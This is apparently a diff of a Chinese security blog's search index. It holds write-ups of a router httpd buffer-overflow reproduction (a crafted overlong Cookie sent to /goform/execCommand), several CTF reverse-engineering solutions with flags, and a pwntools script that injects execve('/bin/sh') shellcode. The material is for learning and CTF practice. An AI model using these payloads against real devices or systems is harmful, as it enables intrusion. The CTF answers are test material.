+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-arm-static -g 1234 -L &lt;抽取出的固件根目录&gt; httpd</span><br></pre></td></tr></table></figure></div>
+
 <p>然后打开gdb-multiarch，依次用下面的命令进行初始化设置并附加到程序上</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb-multiarch</span><br><span class="line">set sysroot &lt;抽取出的固件根目录&gt;</span><br><span class="line">file &lt;httpd文件的位置&gt;</span><br><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gdb-multiarch</span><br><span class="line">set sysroot &lt;抽取出的固件根目录&gt;</span><br><span class="line">file &lt;httpd文件的位置&gt;</span><br><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure></div>
 
 <p> <img  
                      lazyload
@@ -6273,25 +6306,24 @@
                       alt="image"
                 ></p>
 <p>不出意外的话就能使用gdb 调试程序了。</p>
-<p>注：如果喜欢使用IDA 调试程序的话，可以在 IDA 中选择 remote linux debugger，设置文件路径并且设置好虚拟机的 ip 地址，端口注意要填写命令中指定的。</p>
-<h2 id="0x05-搭建网络环境"><a href="#0x05-搭建网络环境" class="headerlink" title="0x05 搭建网络环境"></a><strong>0x05 搭建网络环境</strong></h2><p><strong>操作之前先拍摄快照！！！</strong></p>
+<h2 id="搭建网络环境"><a href="#搭建网络环境" class="headerlink" title="搭建网络环境"></a>搭建网络环境</h2><p><strong>操作之前先拍摄快照！！！</strong></p>
 <p>如果你按照上面的步骤操作完之后，调试程序应该是没有问题的，但是很可能会在一个名为check_network 函数上面栽跟头，按照函数名来推测，它应该是用来检测当前网络连接是否可用的，我们虽然搭建起了调试环境，但是并没有设置好网络环境，所以这个函数不会正常工作(返回值为 0)，如果你尝试将它的返回值修改为 1，程序可以正常运行，但是最终出现的 IP 地址会非常诡异，我分别使用两台机器进行了实验，一次 IP 地址位于日本，而另一次位于墨西哥…..  这就导致程序无法正常接收我们的请求，没法儿进行下一步操作了。</p>
 <p>所以要先配置好qemu 的网络参数，首先安装必要的工具</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install bridge-utils uml-utilities</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install bridge-utils uml-utilities</span><br></pre></td></tr></table></figure></div>
 
 <p>接着要修改网络配置，编辑&#x2F;etc&#x2F;network&#x2F;interfaces</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># interfaces(5) file used by ifup(8) and ifdown(8)</span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line">auto ens33</span><br><span class="line">iface ens33  inet manual</span><br><span class="line">up ifconfig ens33  0.0.0.0 up</span><br><span class="line">auto br0</span><br><span class="line">iface br0 inet dhcp</span><br><span class="line"> bridge_ports ens33</span><br><span class="line"> bridge_maxwait 0 </span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">interfaces(5) file used by ifup(8) and ifdown(8)</span></span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line">auto ens33</span><br><span class="line">iface ens33  inet manual</span><br><span class="line">up ifconfig ens33  0.0.0.0 up</span><br><span class="line">auto br0</span><br><span class="line">iface br0 inet dhcp</span><br><span class="line"> bridge_ports ens33</span><br><span class="line"> bridge_maxwait 0 </span><br></pre></td></tr></table></figure></div>
 
 <p>新建一个shell 脚本 &#x2F;etc&#x2F;qemu-ifup</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">echo &quot;Executing /etc/qemu-ifup&quot;</span><br><span class="line">echo &quot;Bringing $1 for bridged mode...&quot;</span><br><span class="line">sudo /sbin/ifconfig $1 0.0.0.0 promisc up</span><br><span class="line">echo &quot;Adding $1 to br0&quot;</span><br><span class="line">sudo /sbin/brctl addif br0 $1</span><br><span class="line">sleep 3</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">echo &quot;Executing /etc/qemu-ifup&quot;</span><br><span class="line">echo &quot;Bringing $1 for bridged mode...&quot;</span><br><span class="line">sudo /sbin/ifconfig $1 0.0.0.0 promisc up</span><br><span class="line">echo &quot;Adding $1 to br0&quot;</span><br><span class="line">sudo /sbin/brctl addif br0 $1</span><br><span class="line">sleep 3</span><br></pre></td></tr></table></figure></div>
 
 <p>别忘了给脚本足够的权限，然后重启网络服务</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /etc/init.d/networking restart</span><br><span class="line">sudo ifdown ens33</span><br><span class="line">sudo ifup br0</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo /etc/init.d/networking restart</span><br><span class="line">sudo ifdown ens33</span><br><span class="line">sudo ifup br0</span><br></pre></td></tr></table></figure></div>
 
 <p>如果其中哪一步报错，尝试重启一下虚拟机。</p>
 <p>这样，我们的网络环境就配置完成了，接下来开始着手复现漏洞。</p>
-<h2 id="0x06-复现漏洞"><a href="#0x06-复现漏洞" class="headerlink" title="0x06 复现漏洞"></a><strong>0x06 复现漏洞</strong></h2><p>启动程序的命令</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo chroot . ./qemu-arm-static -g 10000 ./bin/httpd</span><br></pre></td></tr></table></figure></div>
+<h2 id="触发漏洞"><a href="#触发漏洞" class="headerlink" title="触发漏洞"></a>触发漏洞</h2><p>启动程序的命令</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chroot . ./qemu-arm-static -g 10000 ./bin/httpd</span><br></pre></td></tr></table></figure></div>
 
 <p>启动之后在IDA 中选择 remote GDB debugger ，配置相应的参数然后连接上去即可调试。</p>
 <p>首先试试看能不能触发漏洞，让程序崩溃。直接运行程序时会输出WeLoveLinux ，之后就没什么反应了，猜测进入了假死状态，使用 IDA 找到用到这个字符串的位置下断点，单步看看会发生什么。</p>
@@ -6310,8 +6342,7 @@
                       alt="image"
                 ></p>
 <p>如果你看到类似的界面(特别是 IP 地址，一般是你的本机地址)，那就说明环境搭建的没有问题。</p>
-<p>接着在有漏洞的函数R7WebsSecurityHandler 开头打一个断点，先打开具有拦截数据包功能的软件(比如 burp suite)，然后用浏览器访问</p>
-<p>http:&#x2F;&#x2F;&lt;你的 IP 地址&gt;&#x2F;goform&#x2F;execCommand</p>
+<p>接着在有漏洞的函数R7WebsSecurityHandler 开头打一个断点，先打开具有拦截数据包功能的软件(比如 burp suite)，然后用浏览器访问 <code>http://&lt;IP&gt;/goform/execCommand</code></p>
 <p>抓一个数据包，这个包的内容应该如下</p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /goform/execCommand HTTP/1.1</span><br><span class="line">Host: 192.168.245.136</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure></div>
 
@@ -6390,12 +6421,13 @@
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /goform/execCommand HTTP/1.1</span><br><span class="line">Host: 192.168.245.136</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cookie: password=&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.gifbbbbbbbbbbbbbbbbbbbbfuckfuck&quot;</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure></div>
 
 <p>附：写完本文之后我又进行了几次调试，发现system 函数始终不能正常被执行，原因是 execve 这个调用一直提示 No such file or directory .  google 到几篇文章也没有具体的解决办法，初步猜测是 qemu 模拟环境不完善，导致找不到 &#x2F;bin&#x2F;sh ，不知道在真机上面能不能得到改善。</p>
-<h2 id="0x07-futher"><a href="#0x07-futher" class="headerlink" title="0x07 futher"></a><strong>0x07 futher</strong></h2><p>我们只是利用漏洞在终端中打印了几个字符，虽然对整个系统没构成什么威胁，但是可以清楚地看到这个漏洞会导致黑客控制程序流程，实际上，是可以利用此漏洞来执行任意代码的，不过那需要较多的ARM 架构知识以及网络编程知识(其中会涉及到有效载荷的编写、反弹 shell 等)，作为一个初学者，我就不献丑啦~</p>
-<p>由于IoT 设备起步较晚，各个设备厂商层出不穷，虽然这些设备方便了我们的工作和生活，但是其中很多存在着各种各样的漏洞，说不定未来的黑客们可以通过利用 IoT 设备漏洞随意的进出你的家门，游戏中的场景也会成为现实。 </p>
-<h2 id="0x08-Reference"><a href="#0x08-Reference" class="headerlink" title="0x08 Reference"></a><strong>0x08 Reference</strong></h2><p><a class="link"   href="https://www.freebuf.com/vuls/160040.html" >https://www.freebuf.com/vuls/160040.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a class="link"   href="https://www.freebuf.com/vuls/160040.html" >https://www.freebuf.com/vuls/160040.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <p><a class="link"   href="https://bbs.pediy.com/thread-225671.htm" >https://bbs.pediy.com/thread-225671.htm <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <p><a class="link"   href="https://www.freebuf.com/articles/wireless/166869.html" >https://www.freebuf.com/articles/wireless/166869.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 ]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
   </entry>
   <entry>
     <title>glibc 中的 malloc 与 free 概述 (二)</title>
@@ -6558,13 +6590,17 @@
 <p>cloudburst ptmalloc flow chart</p>
 <p><a class="link"   href="http://www.cnblogs.com/zhaoyl/p/3820852.html" >http://www.cnblogs.com/zhaoyl/p/3820852.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 ]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
   </entry>
   <entry>
-    <title>看雪 CTF 2019 Q1 [archived]</title>
+    <title>看雪 CTF 2019 Q1</title>
     <url>/2019/03/11/kanxue2019Q1/</url>
-    <content><![CDATA[<h2 id="流浪者"><a href="#流浪者" class="headerlink" title="流浪者"></a>流浪者</h2><p>十道题中最简单的一道题目，程序要求输入一个密码，首先判断了密码是否由字母 + 数字组成，然后会将它们进行一步转换，其算法如下</p>
+    <content><![CDATA[<p>看雪 CTF 2019 Q1</p>
 <span id="more"></span>
 
+<h2 id="流浪者"><a href="#流浪者" class="headerlink" title="流浪者"></a>流浪者</h2><p>十道题中最简单的一道题目，程序要求输入一个密码，首先判断了密码是否由字母 + 数字组成，然后会将它们进行一步转换，其算法如下</p>
 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; flag[i]; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( flag[i] &gt; <span class="string">&#x27;9&#x27;</span> || flag[i] &lt; <span class="string">&#x27;0&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( flag[i] &gt; <span class="string">&#x27;z&#x27;</span> || flag[i] &lt; <span class="string">&#x27;a&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( flag[i] &gt; <span class="string">&#x27;Z&#x27;</span> || flag[i] &lt; <span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">        sub_4017B0();</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        int_flag[i] = flag[i] - <span class="number">29</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      int_flag[i] = flag[i] - <span class="number">87</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    int_flag[i] = flag[i] - <span class="number">48</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
 <p>然后会将经过转换的密码传入另一个函数，代码如下</p>
@@ -6609,6 +6645,9 @@
 <p>直到一条 long jmp 指令，会将程序执行流定位到这段数据中，这时我才发现所谓的数据原来是一段动态生成的 shellcode，其功能是将每个字符加上 0x7f，之后会和预置的数据进行对比。那么通过单步跟踪找到这 4 组数据解密就可以得到真正的密码。</p>
 <p>最终得到 flag ：simpower91a123</p>
 ]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
   </entry>
   <entry>
     <title>glibc 中的 malloc 与 free 概述 (一)</title>
@@ -6865,6 +6904,9 @@
 <p><a class="link"   href="https://mqzhuang.iteye.com/blog/1064803" >https://mqzhuang.iteye.com/blog/1064803 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <p>华庭 《Glibc 内存管理 Ptmalloc2 源代码分析》<br>cloudburst ptmalloc flow chart</p>
 ]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
   </entry>
   <entry>
     <title>PYC 文件的简单分析</title>
@@ -6944,6 +6986,9 @@
 <p>当然，这种简洁至上的设计思想也决定了 python 不能以效率致胜，不过这也无法阻挡程序员对它的热爱。</p>
 <h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a class="link"   href="https://rednaxelafx.iteye.com/blog/382412" >python 字节码一览 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://kdr2.com/tech/python/pyc-format.html" >PYC文件格式分析 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="http://python.jobbole.com/84599/" >Python程序的执行原理 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://www.cnblogs.com/xuchunlin/p/6986247.html" >python 之禅 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 ]]></content>
+      <categories>
+        <category>MISC</category>
+      </categories>
   </entry>
   <entry>
     <title>HGAME 2019 week1</title>
@@ -7072,9 +7117,12 @@
 <h2 id="Base全家"><a href="#Base全家" class="headerlink" title="Base全家"></a>Base全家</h2><p>给出一个很大的文件，里面是很多层编码嵌套起来的，推荐到<a class="link"   href="https://gchq.github.io/CyberChef/" >这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>解密。  </p>
 <p>flag: hgame{40ca78cde14458da697066eb4cc7daf6}</p>
 ]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
   </entry>
   <entry>
-    <title>鹏程杯 2018 部分题目复现 [archived]</title>
+    <title>鹏程杯 2018 部分题目复现</title>
     <url>/2019/01/20/pcb2018-online/</url>
     <content><![CDATA[<p>这是一份迟来的 wp，最近一直在忙考试什么的，只能抽时间来复现一下题目。首先要吐槽一下 pcb 的线下比赛，虽然是第一次举办，但是平台也要测试好再上，否则会出现比赛一开始平台就崩了的尴尬情况  ORZ。<br>不过线上赛的题目质量还不错，学到了一些东西。</p>
 <span id="more"></span>
@@ -7170,11 +7218,13 @@
 <p>脚本</p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(log_level=&quot;DEBUG&quot;, arch=&quot;amd64&quot;, os=&quot;linux&quot;)</span><br><span class="line">p = process(&quot;./treasure&quot;)</span><br><span class="line">p.recvuntil(&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;)</span><br><span class="line">p.sendline(&quot;y&quot;)</span><br><span class="line">p.recvuntil(&quot;start!!!!&quot;)</span><br><span class="line">shellcode = asm(&#x27;&#x27;&#x27;</span><br><span class="line">                 push rdx</span><br><span class="line">                 pop rsi</span><br><span class="line">                 push 100</span><br><span class="line">                 pop rdx</span><br><span class="line">                 syscall</span><br><span class="line">                 ret</span><br><span class="line">                 &#x27;&#x27;&#x27;)</span><br><span class="line">print(len(shellcode))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">shellcode_x64 = &#x27;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x3b\x58\x99\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\xb0\x3b\x0f\x05&#x27;</span><br><span class="line">sleep(0.1)</span><br><span class="line">print(len(shellcode_x64))</span><br><span class="line">p.sendline(shellcode_x64)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
 
-
 ]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
   </entry>
   <entry>
-    <title>湖湘杯 2018 线上赛部分题目复现 [archived]</title>
+    <title>湖湘杯 2018 线上赛部分题目复现</title>
     <url>/2018/11/20/hxb-2018-online/</url>
     <content><![CDATA[<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="1-Replace"><a href="#1-Replace" class="headerlink" title="1. Replace"></a>1. Replace</h3><p>程序给加了 UPX 的壳，直接在 linux 下面脱掉，注意脱完壳的程序就不能正常运行了。<br>脱了壳直接丢到 IDA 里面去看，逻辑很清晰，主函数只有一点点代码</p>
 <span id="more"></span>
@@ -7340,11 +7390,14 @@
                 ></p>
 <p>最后缺了一个括号，补上就好了。</p>
 ]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
   </entry>
   <entry>
-    <title>HCTF 2018 部分复现 [archived]</title>
+    <title>HCTF 2018</title>
     <url>/2018/11/09/HCTF2018/</url>
-    <content><![CDATA[<p>和师傅们打了一天半的 HCTF，题目质量很高，感谢杭电的师傅们带来的精彩比赛，膜一波各位大佬，我还是太菜了。。。</p>
+    <content><![CDATA[<p>和师傅们打了一天半的 HCTF，题目质量很高，感谢杭电的师傅们带来的精彩比赛。</p>
 <span id="more"></span>
 
 
@@ -7504,6 +7557,9 @@
 <p>flag: <strong>hctf{ddddddddddddddssaasasasasasasasasas}</strong></p>
 <h3 id="小总结-1"><a href="#小总结-1" class="headerlink" title="小总结"></a>小总结</h3><p>调试驱动这是第一次，把环境搭好之后就可以像调试正常可执行程序一样调试内核和驱动了。<br>这道题目的数组应该是一维的，导致静态分析难一些，动态调试就很简单。</p>
 ]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
   </entry>
   <entry>
     <title>De-DeCompiler</title>
@@ -7636,13 +7692,17 @@
 <h2 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h2><p>看了看雪的这篇文章，简单进行小总结，了解到几种很经典的反反编译方法，其中有几个非常巧妙，包括隐藏真实代码到垃圾代码，修改返回地址，注册假的 SEH 等等，反反编译还有更多的方法，虽然手法多种多样，但是最重要的是欺骗反编译器，隐藏程序的实际流程，不过再强的花指令也是可以被清除的，所以通常可以配合软件加壳，代码混淆等技术，增大逆向难度。</p>
 <p>识别花指令的办法：当看到某些指令是不常见的，或者一些指令序列毫无逻辑可言，那么就要小心了，因为这里可能就是一段花指令，如果没有明显的花指令出现，那么就要关注特殊的指令序列，包括自行注册 SEH ，修改程序的返回地址等等，其实花指令做到的只是反静态分析，对于经验老到的逆向工作者来说，动态调试通常是破解这些花指令的好办法。</p>
 ]]></content>
+      <categories>
+        <category>MISC</category>
+      </categories>
   </entry>
   <entry>
-    <title>Reversing.kr 6-9 [archived]</title>
+    <title>Reversing.kr 6-9</title>
     <url>/2018/09/08/reversingkr6-9/</url>
-    <content><![CDATA[<h2 id="06-ImagePrc"><a href="#06-ImagePrc" class="headerlink" title="06 ImagePrc"></a>06 ImagePrc</h2><p>打开程序，里面有一个 check 按钮，但是没有文本框等常规元素，直接点击按钮会弹窗报错，在偶然的操作中发现，可以按住鼠标左键在窗口中画画：</p>
+    <content><![CDATA[<p>Reversing.kr 上面的题目。</p>
 <span id="more"></span>
 
+<h2 id="06-ImagePrc"><a href="#06-ImagePrc" class="headerlink" title="06 ImagePrc"></a>06 ImagePrc</h2><p>打开程序，里面有一个 check 按钮，但是没有文本框等常规元素，直接点击按钮会弹窗报错，在偶然的操作中发现，可以按住鼠标左键在窗口中画画：</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
@@ -7823,13 +7883,17 @@
                 ></p>
 <p>flag： <strong>Colle System</strong></p>
 ]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
   </entry>
   <entry>
-    <title>Reversing.kr 4 5 [archived]</title>
+    <title>Reversing.kr 4 5</title>
     <url>/2018/09/04/reversingkr4-5/</url>
-    <content><![CDATA[<h2 id="04-Music-Player"><a href="#04-Music-Player" class="headerlink" title="04 Music Player"></a>04 Music Player</h2><p>第四题增加了一些难度，打开文件，是一个简单的音乐播放器，但是载入的歌曲最多只能播放1分钟，根据题目提示，如果能够使它播放超过一分钟，就能看到flag。  </p>
+    <content><![CDATA[<p>Reversing.kr 上面的题目。</p>
 <span id="more"></span>
 
+<h2 id="04-Music-Player"><a href="#04-Music-Player" class="headerlink" title="04 Music Player"></a>04 Music Player</h2><p>第四题增加了一些难度，打开文件，是一个简单的音乐播放器，但是载入的歌曲最多只能播放1分钟，根据题目提示，如果能够使它播放超过一分钟，就能看到flag。  </p>
 <p>程序没有加壳，直接丢进IDA看会发现代码非常混乱，有很多未解析的代码，如果你使用PEID等工具检查了程序的话就会发现，程序使用VB编写，VB有两种编译模式，第一个叫做 P-Code(伪代码编译)，另一种则是正常的本机代码编译，P-Code 模式会将代码编译为VB特有的伪代码形式，由 VB 的虚拟机运行，不巧的是，微软并没有公开这个虚拟机的信息，但是还是有逆向方法的，只不过需要注意一些细节，OD可以正常使用，但是在修改机器码的时候就需要特别注意了。通过使用VB专用的逆向工具也能得到一些有用的信息，比如使用 VBExplore 打开这个程序：<br><img  
                      lazyload
                      src="/images/loading.svg"
@@ -7995,13 +8059,17 @@
                 ></p>
 <p>flag：<strong>2687109798</strong></p>
 ]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
   </entry>
   <entry>
-    <title>Reversing.kr 1-3 [archived]</title>
+    <title>Reversing.kr 1-3</title>
     <url>/2018/09/02/reversingkr1-3/</url>
-    <content><![CDATA[<h2 id="01-Easy-Crack"><a href="#01-Easy-Crack" class="headerlink" title="01 Easy Crack"></a>01 Easy Crack</h2><p>基础题，不需要动态分析，直接丢到IDA中，Shift+F12搜索字符串，发现有 “Congratulation !!” 以及 “Incorrect Password” 的字样，定位到相关函数，就能看到处理逻辑：</p>
+    <content><![CDATA[<p>Reversing.kr 上面的题目。</p>
 <span id="more"></span>
 
+<h2 id="01-Easy-Crack"><a href="#01-Easy-Crack" class="headerlink" title="01 Easy Crack"></a>01 Easy Crack</h2><p>基础题，不需要动态分析，直接丢到IDA中，Shift+F12搜索字符串，发现有 “Congratulation !!” 以及 “Incorrect Password” 的字样，定位到相关函数，就能看到处理逻辑：</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
@@ -8114,5 +8182,8 @@
                 ></p>
 <p>想要详细了解如何脱壳可以自行百度。</p>
 ]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
   </entry>
 </search>
